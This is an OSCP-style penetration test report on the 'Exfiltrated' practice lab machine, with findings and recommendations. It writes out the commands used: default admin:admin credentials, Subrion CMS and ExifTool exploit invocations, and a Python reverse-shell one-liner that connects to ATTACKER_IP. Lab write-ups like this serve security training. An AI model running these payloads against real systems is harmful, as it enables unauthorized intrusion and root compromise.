# PG Practice Exfiltrated - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-4-8

---

## 0. Lesson Learned

Make sure all exploit dependencies are installed.

---

## 1. Executive Summary

An assessment of the target system identified multiple critical vulnerabilities leading to full system compromise. Initial access was achieved through an authenticated file upload vulnerability in Subrion CMS, followed by remote code execution. Privilege escalation was accomplished via a vulnerable cron job leveraging ExifTool, resulting in root access.

---

## 2. Scope

- **Target:** 192.168.190.163
- **Environment:** PG Practice Exfiltrated
- **Testing Window:** 2026-4-8
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

A full TCP port scan was conducted.

Command:

```
nmap -p- -sC -sV 192.168.190.163 -T4 -oA exfiltrated_tcp
```

Output (relevant):

```
22/tcp open  ssh   OpenSSH 8.2p1 Ubuntu
80/tcp open  http  Apache httpd 2.4.41 Ubuntu
```

Interpretation:

The target exposes SSH and HTTP services, indicating a web-based attack surface.

---

## 5. Enumeration

### Web Enumeration

The web application was accessed via HTTP.

A virtual host was configured:

Command:

```
nano /etc/hosts
```

Entry added:

```
192.168.190.163 exfiltrated.offsec
```

Browsing revealed a CMS panel:

```
http://exfiltrated.offsec/panel/
```

Interpretation:

The application uses Subrion CMS.

## Credential Testing

Default credentials were tested.

Credentials:

```
admin : admin
```

Result:

Successful login.

Interpretation:

Default credentials allowed administrative access.

## Vulnerability Identification

Searchsploit was used to identify vulnerabilities.

Command:

```
searchsploit subrion 4.2.1
searchsploit -m 49876
```

Interpretation:

An arbitrary file upload vulnerability (CVE-2018-19422) was identified.

---

## 6. Initial Access

The exploit was executed to gain a webshell.

Command:

```
python3 49876.py -u http://exfiltrated.offsec/panel/ -l admin -p admin
```

Output (relevant):

```
Login Successful!
Upload Success... Webshell path: /panel/uploads/mruyovxuwbiklnh.phar
```

Interpretation:

A webshell was successfully uploaded.

## Reverse Shell

A reverse shell was established.

Listener:

```
nc -lnvp 443
```

Payload:

```
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
```

Output:

```
uid=33(www-data)
```

Interpretation:

Initial access obtained as www-data.

---

## 7. Post-Exploitation

Shell stabilization was performed.

Command:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
```

Enumeration script executed:

Command:

```
wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh -O lse.sh
chmod 700 lse.sh

./lse.sh
```

Interpretation:

System enumeration revealed cron jobs and potential privilege escalation vectors.

---

## 8. Privilege Escalation

### Cron Job Enumeration

Command:

```
cat /etc/crontab
```

Output:

```
* * * * * root bash /opt/image-exif.sh
```

Interpretation:

A script runs as root every minute.

### Script Analysis

Command:

```
cat /opt/image-exif.sh
```

Output (relevant):

```
IMAGES='/var/www/html/subrion/uploads'
exiftool "$IMAGES/$filename"
```

Interpretation:

ExifTool processes user-controlled files, indicating possible exploitation.

### Vulnerability Exploitation

A known ExifTool vulnerability (CVE-2021-22204) was used.

Command:

```
python3 50911.py -s ATTACKER_IP 443
```

Output:

```
Exploit image written to image.jpg
```

Malicious image uploaded via CMS.

### Root Shell

Listener:

```
nc -lnvp 443
```

Output:

```
uid=0(root)
```

Interpretation:

Privilege escalation successful via ExifTool RCE.

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

```
cat /home/coaran/local.txt
```

**Root Flag**: *REDACTED*

```
cat /root/proof.txt
```

This confirms full system compromise.

---

## 10. Findings & Recommendations

### **Finding:** Default Credentials

**Severity:** High

**Description:**
The application allowed authentication using default or well-known credentials.

**Impact:**
Attackers could gain unauthorized administrative access to the system.

**Recommendation:**
Disable default credentials, enforce strong password policies, and require credential changes upon initial setup.

### **Finding:** Arbitrary File Upload Leading to Remote Code Execution

**Severity:** Critical

**Description:**
The application allowed uploading of files without proper validation, enabling execution of malicious code on the server.

**Impact:**
Attackers could upload and execute arbitrary code, resulting in full system compromise.

**Recommendation:**
Validate file uploads, restrict allowed file types, disable execution in upload directories, and implement server-side security controls.

### **Finding:** Vulnerable File Processing in Privileged Scheduled Task

**Severity:** Critical

**Description:**
A scheduled task executed a file-processing utility (e.g., ExifTool) on user-controlled files without proper validation.

**Impact:**
Attackers could craft malicious files to trigger command execution with elevated privileges, leading to root compromise.

**Recommendation:**
Update vulnerable utilities, avoid processing untrusted files with privileged tasks, and validate or isolate input before execution.

### **Finding:** Insecure Cron Job Processing User-Controlled Input

**Severity:** High

**Description:**
A cron job running with elevated privileges processed files from a user-accessible or web-exposed directory.

**Impact:**
Attackers could manipulate input files to achieve privilege escalation.

**Recommendation:**
Avoid executing privileged tasks on user-controlled input, restrict directory permissions, and validate all inputs processed by scheduled tasks.

---

## 11. Appendix

Subrion CMS 4.2.1 RCE Exploit - 
[https://www.exploit-db.com/exploits/49876](https://www.exploit-db.com/exploits/49876)

Linux Smart Enumeration Tool -
[https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)

ExifTool 12.23 RCE Exploit - 
[https://www.exploit-db.com/exploits/50911](https://www.exploit-db.com/exploits/50911)